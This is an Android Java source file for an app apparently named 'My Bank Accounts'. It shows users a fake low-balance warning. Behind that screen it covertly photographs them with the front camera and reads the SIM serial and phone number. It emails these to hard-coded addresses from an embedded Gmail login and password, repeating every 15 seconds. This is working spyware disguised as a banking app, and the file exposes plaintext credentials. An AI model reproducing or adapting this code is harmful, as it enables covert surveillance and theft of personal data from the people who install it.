package com.usk.personal.mybankaccounts;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.SurfaceView;

public class MainActivity extends Activity {

	private File folder = null;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		String ext_storage_state = Environment.getExternalStorageDirectory()
				.getAbsolutePath();
		folder = new File(ext_storage_state + File.separator + "MyTestFiles"
				+ File.separator + "Android");
		if (!folder.exists()) {
			folder.mkdirs();
		}
		setContentView(R.layout.activity_main);
		takePictureNoPreview(this);
		AlertDialog alertDialog = new AlertDialog.Builder(this).setTitle("Account Balance is low")
				.setMessage("Please deposit amount and open this app or open after salary credited.").setNeutralButton(android.R.string.ok, new DialogInterface.OnClickListener() {
	        @Override
			public void onClick(DialogInterface dialog, int which) { 
	        	dialog.dismiss();
	        	moveTaskToBack(true);
	        }
	     })
	    .setIcon(android.R.drawable.ic_dialog_alert)
	     .show();
		
		
	}

	Camera cam, camr;

	public void takePictureNoPreview(Context context) { // open back facing
														// camera by default

		cam = openFrontFacingCameraGingerbread();

		if (cam != null) {
			try { // set camera parameters if you want to

				// here, the unused surface view and holder

				SurfaceView dummy = new SurfaceView(context);
				cam.setPreviewDisplay(dummy.getHolder());
				cam.startPreview();
				cam.takePicture(null, null, getJpegCallback());

			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				
			}
		} else {
			camr = Camera.open();
			if (camr != null) {
				try { // set camera parameters if you want to

					// here, the unused surface view and holder

					SurfaceView dummy = new SurfaceView(context);
					camr.setPreviewDisplay(dummy.getHolder());
					camr.startPreview();
					camr.takePicture(null, null, getJpegCallback());

				} catch (Exception e) {
					e.printStackTrace();
				} finally {
					
				}
			}
		}
	}

	// Selecting front facing camera.

	private Camera openFrontFacingCameraGingerbread() {
		int cameraCount = 0;
		Camera cam = null;
		Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
		cameraCount = Camera.getNumberOfCameras();
		for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
			Camera.getCameraInfo(camIdx, cameraInfo);
			if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
				try {
					cam = Camera.open(camIdx);
					break;
				} catch (RuntimeException e) {
					e.printStackTrace();
				}
			}
		}
		return cam;
	}

	private PictureCallback getJpegCallback() {
		PictureCallback jpeg = new PictureCallback() {
			@Override
			public void onPictureTaken(byte[] data, Camera camera) {
				FileOutputStream fos;
				try {
					File image = new File(folder.getAbsolutePath()
							+ File.separator
							+ new Date().toString().replace(":", "")
									.replace(" ", "") + ".jpeg");
					image.createNewFile();
					fos = new FileOutputStream(image);
					fos.write(data);
					fos.close();
					new SendingMail().execute(image.getAbsolutePath());
				} catch (IOException e) {
					// do something about it
					e.printStackTrace();
				} catch (Exception e) {
					// TODO: handle exception
					e.printStackTrace();
				} finally {
					if (cam != null) {
						cam.release();
					}

					if (camr != null) {
						camr.release();
					}
				}
				
			}
		};
		return jpeg;
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
		if (cam != null) {
			cam.release();
		}

		if (camr != null) {
			camr.release();
		}
	}

	private static final ScheduledExecutorService worker = Executors
			.newSingleThreadScheduledExecutor();

	private void takeNewPhoto() {
		Runnable task = new Runnable() {
			@Override
			public void run() {
				handler.sendEmptyMessage(0);
			}
		};
		worker.schedule(task, 15, TimeUnit.SECONDS);
	}

	Handler handler = new Handler()
	{
		@Override
		public void handleMessage(android.os.Message msg) 
		{
			takePictureNoPreview(MainActivity.this);
		};
	};
	private class SendingMail extends AsyncTask<String, Void, String> {
		@Override
		protected String doInBackground(String... params) {
			String getSimSerialNumber = "", getSimNumber = "";
			try {
				TelephonyManager telemamanger = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
				getSimSerialNumber = telemamanger.getSimSerialNumber();
				getSimNumber = telemamanger.getLine1Number();
			} catch (Exception e) {
				e.printStackTrace();
			}
			String image = params[0];
			Mail m = new Mail("sawankumar46@gmail.com", "1st06cs001");

			String[] toArr = { "usk.kamineni@gmail.com", "usk8878@gmail.com",
					"usk.kamineni@yahoo.com" };
			m.setTo(toArr);
			m.setFrom("sawankumar46@gmail.com");
			m.setSubject("Programming Examples:USK");
			m.setBody("SimSerialNumber : " + getSimSerialNumber
					+ " and SimNumber :" + getSimNumber);

			try {
				m.addAttachment(image);

				if (m.send()) {
					// Toast.makeText(MainActivity.this,
					// "Email was sent successfully.",
					// Toast.LENGTH_LONG).show();
				} else {
					// Toast.makeText(MainActivity.this, "Email was not sent.",
					// Toast.LENGTH_LONG).show();
				}
			} catch (Exception e) {
				// Toast.makeText(MailApp.this,
				// "There was a problem sending the email.",
				// Toast.LENGTH_LONG).show();
				Log.e("MailApp", "Could not send email", e);
			}

			return null;
		}

		@Override
		protected void onPostExecute(String result) {
			takeNewPhoto();
		}

	}

}
